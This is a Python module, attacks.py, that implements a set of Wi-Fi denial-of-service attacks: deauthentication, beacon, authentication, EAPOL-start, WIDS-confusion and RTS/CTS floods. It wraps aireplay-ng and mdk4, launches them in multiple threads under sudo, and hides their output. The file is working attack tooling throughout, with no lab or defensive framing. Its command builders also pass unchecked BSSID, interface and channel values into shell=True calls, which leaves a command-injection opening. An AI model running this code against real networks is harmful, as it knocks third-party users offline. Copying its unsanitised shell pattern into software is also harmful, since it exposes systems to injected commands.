#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
attacks.py - Module with implementation of various DoS attacks for Wi-Fi.

Features:
- Redirect stdout/stderr to DEVNULL to suppress output of mdk4 help/manuals.
- Support for dynamic parameters (pps, threads, power, duration),
where some of them may not be used in a specific attack,
but the general interface is the same.
- If necessary to expand for SDR, Evil Twin, etc., you need to
add the corresponding Attack subclasses.
"""

import os
import threading
import subprocess
import signal
import time

DEVNULL = subprocess.DEVNULL  # for brevity output redirection


class Attack:
    """
    Base class for describing an attack (DoS strategy).
    Each subclass must override build_command(...)

    to generate the final command (mdk4/aireplay-ng etc.).
    """

    def __init__(self, name):
        self.name = name

    def build_command(self, **kwargs):
        """
        Must be overridden in subclass.
        kwargs may include: pps_level, power_level, duration_level,
        bssid, interface, channel, etc.
        """
        raise NotImplementedError("Must override build_command in subclass")

    def run(self, pps_level=1, power_level=1, duration_level=1,
            threads_level=1, **kwargs):
        threads = []
        for i in range(threads_level):
            t = threading.Thread(
                target=self._run_single_thread,
                args=(i + 1, pps_level, power_level, duration_level),
                kwargs=kwargs
            )
            t.start()
            threads.append(t)
        return threads

    def _run_single_thread(self, instance_id, pps_level, power_level,
                           duration_level, **kwargs):
        cmd = self.build_command(
            pps_level=pps_level,
            power_level=power_level,
            duration_level=duration_level,
            **kwargs
        )
        print(f"[ATTACK] {self.name} (instance {instance_id}): {cmd}")
        try:
            subprocess.run(cmd, shell=True, preexec_fn=os.setsid,
                           stdout=DEVNULL, stderr=DEVNULL)
        except Exception as e:
            print(f"[ERROR] {self.name} failed cmd={cmd}\n{e}")

    def stop(self):
        pass


class DeauthFlood(Attack):
    """
    Deauth flood via aireplay-ng.
    aireplay-ng --deauth 0 -a <bssid> <iface>
    """

    def __init__(self):
        super().__init__("DeauthFlood")

    def build_command(self, bssid="", interface="", **kwargs):
        return f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"


class BeaconFlood(Attack):
    """
    Beacon flood via mdk4 b-режим.
    Example: sudo mdk4 <iface> b -g -s <value>
    """

    def __init__(self):
        super().__init__("BeaconFlood")

    def build_command(self, interface="", pps_level=1, **kwargs):
        s_val = 100 * pps_level
        return f"sudo mdk4 {interface} b -g -s {s_val}"


class AuthDOS(Attack):
    """
    Auth DOS (mdk4 a- mode).
    -a <bssid>, -s <pps>
    """

    def __init__(self):
        super().__init__("AuthDOS")

    def build_command(self, bssid="", interface="", pps_level=1, **kwargs):
        s_val = 50 * pps_level
        return f"sudo mdk4 {interface} a -a {bssid} -s {s_val}"


class DeauthFloodMDK(Attack):
    """
    Deauth Flood via mdk4 d- mode.
    -B <bssid>, -c <channel>, -s => random MAC
    """

    def __init__(self):
        super().__init__("DeauthFloodMDK")

    def build_command(self, bssid="", channel="", interface="",
                      pps_level=1, **kwargs):
        return f"sudo mdk4 {interface} d -B {bssid} -c {channel} -s"


class EAPOLStartFlood(Attack):
    """
    EAPOL Start flood (mdk4 e- mode).
    -t <bssid>, -s => flood
    """

    def __init__(self):
        super().__init__("EAPOLStartFlood")

    def build_command(self, bssid="", interface="", pps_level=1, **kwargs):
        s_val = 10 * pps_level
        return f"sudo mdk4 {interface} e -t {bssid} -s {s_val}"


class WIDSConfusion(Attack):
    """
    WIDS Confusion (mdk4 w- mode).
    -e <bssid>, -c <channel>, -s
    """

    def __init__(self):
        super().__init__("WIDSConfusion")

    def build_command(self, bssid="", channel="", interface="",
                      pps_level=1, **kwargs):
        s_val = 5 * pps_level
        return f"sudo mdk4 {interface} w -e {bssid} -c {channel} -s {s_val}"


class RTSCTSFlood(Attack):
    """
    RTS/CTS Flood (mdk4 z- mode).
    """

    def __init__(self):
        super().__init__("RTSCTSFlood")

    def build_command(self, interface="", pps_level=1, **kwargs):
        # mdk4 <iface> z
        return f"sudo mdk4 {interface} z"


def stop_all_attacks():
    """
    pkill aireplay-ng & pkill mdk4 
    """
    try:
        subprocess.run("sudo pkill -f 'aireplay-ng'", shell=True,
                       stdout=DEVNULL, stderr=DEVNULL)
        subprocess.run("sudo pkill -f 'mdk4'", shell=True,
                       stdout=DEVNULL, stderr=DEVNULL)
        print("[INFO] Stopped all known processes (aireplay-ng, mdk4).")
    except Exception as e:
        print(f"[ERROR] stop_all_attacks: {e}")
